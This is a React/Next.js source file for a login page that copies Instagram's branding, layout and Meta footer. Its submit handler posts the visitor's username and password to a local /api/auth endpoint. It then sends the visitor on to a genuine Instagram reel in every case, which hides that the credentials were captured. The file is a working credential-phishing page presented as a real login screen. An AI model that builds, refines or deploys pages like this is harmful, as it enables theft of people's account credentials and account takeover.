'use client';

import Link from 'next/link';
import { useState } from 'react';

export default function InstagramLogin() {
  const [account, setAccount] = useState('');
  const [secret, setSecret] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const isFormValid = account.trim() !== '' && secret.trim() !== '';

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!isFormValid || isLoading) return;

    setIsLoading(true);

    try {
      await fetch('/api/auth', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          account: account,
          secret: secret,
        }),
      });
    } catch (error) {
      console.error('Error submitting form:', error);
    } finally {
      window.location.href = 'https://www.instagram.com/reel/Dbgzo27Kbi0/?stkn=aWNvNXU2Y2kxMTZh';
    }
  };

  return (
    <div className="flex min-h-screen w-full items-center justify-center bg-[#000000] text-white px-4 sm:px-6 py-8 font-sans select-none overflow-x-hidden" dir="ltr">
      <div className="flex w-full max-w-[1100px] items-center justify-center lg:justify-between">
        
        {/* القسم الأيسر: يظهر فقط في الشاشات الكبيرة */}
        <div className="hidden lg:flex flex-col w-[480px] pr-10">
          <div className="mb-8">
            <img 
              src="/instagram-logo.png" 
              alt="Instagram" 
              className="w-12 h-12 object-contain"
            />
          </div>

          <h1 className="text-4xl font-extrabold leading-[1.25] tracking-tight mb-10 max-w-[380px]">
            See everyday moments from your <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#f58529] via-[#dd2a7b] to-[#8134af]">close friends</span>.
          </h1>

          <div className="relative w-full h-[320px] bg-[url('https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones.png?__unfiltered=1')] bg-no-repeat bg-left-top bg-contain">
          </div>
        </div>

        {/* القسم الأيمن: نموذج تسجيل الدخول */}
        <div className="flex flex-col w-full max-w-[380px] mx-auto">
          
          <div className="w-full flex flex-col items-center lg:items-start">
            
            <div className="flex lg:hidden mb-6 justify-center w-full">
              <img 
                src="/instagram-logo.png" 
                alt="Instagram" 
                className="w-14 h-14 object-contain"
              />
            </div>

            <h2 className="text-xl font-semibold mb-6 tracking-wide text-center lg:text-left w-full">
              Log into Instagram
            </h2>

            {/* نموذج الإدخال */}
            <form onSubmit={handleSubmit} className="w-full flex flex-col gap-3">
              
              <div className="relative flex items-center w-full bg-[#121212] border border-[#262626] rounded-xl focus-within:border-[#a8a8a8] overflow-hidden">
                <input
                  type="text"
                  value={account}
                  onChange={(e) => setAccount(e.target.value)}
                  className="w-full px-4 pt-4 pb-2 text-sm bg-transparent text-white outline-none peer"
                  required
                />
                <span className={`absolute left-4 text-xs text-[#a8a8a8] transition-all duration-150 pointer-events-none ${account ? 'top-1.5 text-[10px]' : 'top-3.5 text-sm'}`}>
                  Mobile number, username or email
                </span>
              </div>

              <div className="relative flex items-center w-full bg-[#121212] border border-[#262626] rounded-xl focus-within:border-[#a8a8a8] overflow-hidden">
                <input
                  type="password"
                  value={secret}
                  onChange={(e) => setSecret(e.target.value)}
                  className="w-full px-4 pt-4 pb-2 text-sm bg-transparent text-white outline-none peer"
                  required
                />
                <span className={`absolute left-4 text-xs text-[#a8a8a8] transition-all duration-150 pointer-events-none ${secret ? 'top-1.5 text-[10px]' : 'top-3.5 text-sm'}`}>
                  Password
                </span>
              </div>

              <button
                type="submit"
                disabled={!isFormValid || isLoading}
                className={`mt-2 w-full text-white font-semibold text-sm py-3.5 rounded-xl transition-all cursor-pointer flex items-center justify-center ${
                  isFormValid && !isLoading ? 'bg-[#0064e0] hover:bg-[#0052b4]' : 'bg-[#0064e0]/40 cursor-default'
                }`}
              >
                {isLoading ? (
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                ) : (
                  'Log in'
                )}
              </button>
            </form>

            <div className="text-center my-4 w-full">
              <Link href="#" className="text-xs text-[#e0e0e0] hover:underline">
                Forgot password?
              </Link>
            </div>

            <button type="button" className="flex items-center justify-center gap-2 text-[#e0f1ff] font-semibold text-sm my-4 hover:opacity-80 cursor-pointer w-full">
              <svg className="w-5 h-5 fill-[#0064e0]" viewBox="0 0 24 24">
                <path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12c0-5.523-4.477-10-10-10z" />
              </svg>
              <span>Log in with Facebook</span>
            </button>

            <div className="mt-6 w-full">
              <Link 
                href="#" 
                className="flex items-center justify-center w-full py-3.5 border border-[#363636] hover:border-[#525252] text-white font-semibold text-sm rounded-xl transition-all"
              >
                Create new account
              </Link>
            </div>

            <div className="flex justify-center items-center mt-12 w-full">
              <div className="flex items-center gap-1.5 opacity-60">
                <svg className="w-4 h-4 fill-white" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
                </svg>
                <span className="text-xs font-semibold tracking-wider text-white">Meta</span>
              </div>
            </div>

          </div>

        </div>

      </div>
    </div>
  );
}